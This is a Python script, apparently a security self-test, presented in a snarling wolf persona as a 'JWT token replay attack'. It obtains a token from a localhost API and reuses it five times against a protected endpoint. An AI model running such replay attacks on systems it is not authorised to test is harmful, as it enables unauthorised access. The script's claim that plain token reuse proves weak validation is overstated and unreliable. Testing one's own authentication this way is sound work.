"""🐺 JWT TOKEN REPLAY ATTACK EXPLOIT

*snarls with predatory glee* Your token validation is WEAK! Tokens can be replayed
multiple times without proper nonce validation!

*bares fangs with savage satisfaction* This exploit demonstrates how an attacker
can replay captured tokens to gain unauthorized access.
"""

import time
from dataclasses import dataclass

import requests
from rich.console import Console

console = Console()


@dataclass
class ReplayResult:
    """Result of a token replay attempt"""

    success: bool
    attempt_number: int
    response_code: int
    response_time: float
    description: str


class TokenReplayAttack:
    """*circles with menacing intent* Exploits JWT token replay vulnerabilities
    """

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()

    def run_exploit(self) -> list[ReplayResult]:
        """*snarls with predatory glee* Execute token replay attacks
        """
        console.print("[bold red]🐺 JWT TOKEN REPLAY ATTACK[/bold red]")

        # Get a valid token first
        token = self._get_valid_token()
        if not token:
            return [ReplayResult(False, 0, 0, 0, "Could not obtain valid token")]

        results = []

        # Test multiple replays
        for i in range(5):
            result = self._test_token_replay(token, i + 1)
            results.append(result)
            time.sleep(0.5)  # Small delay between attempts

        return results

    def _get_valid_token(self) -> str | None:
        """Get a valid JWT token for testing"""
        try:
            # Try to register and login
            register_data = {
                "username": f"testuser_{int(time.time())}",
                "email": f"test_{int(time.time())}@example.com",
                "password": "testpassword123",
            }

            response = self.session.post(
                f"{self.base_url}/api/auth/register", json=register_data, timeout=5,
            )

            if response.status_code not in [200, 201, 409]:
                return None

            # Login to get token
            login_data = {
                "username": register_data["username"],
                "password": register_data["password"],
            }

            response = self.session.post(
                f"{self.base_url}/api/auth/login", json=login_data, timeout=5,
            )

            if response.status_code == 200:
                data = response.json()
                return data.get("access_token")

            return None

        except Exception:
            return None

    def _test_token_replay(self, token: str, attempt: int) -> ReplayResult:
        """Test token replay"""
        try:
            start_time = time.time()

            headers = {"Authorization": f"Bearer {token}"}
            response = self.session.get(
                f"{self.base_url}/api/protected", headers=headers, timeout=5,
            )

            end_time = time.time()
            response_time = end_time - start_time

            success = response.status_code == 200

            return ReplayResult(
                success=success,
                attempt_number=attempt,
                response_code=response.status_code,
                response_time=response_time,
                description=f"Token replay attempt {attempt} - {'SUCCESS' if success else 'BLOCKED'}",
            )

        except Exception as e:
            return ReplayResult(
                success=False,
                attempt_number=attempt,
                response_code=0,
                response_time=0,
                description=f"Token replay attempt {attempt} - ERROR: {e!s}",
            )
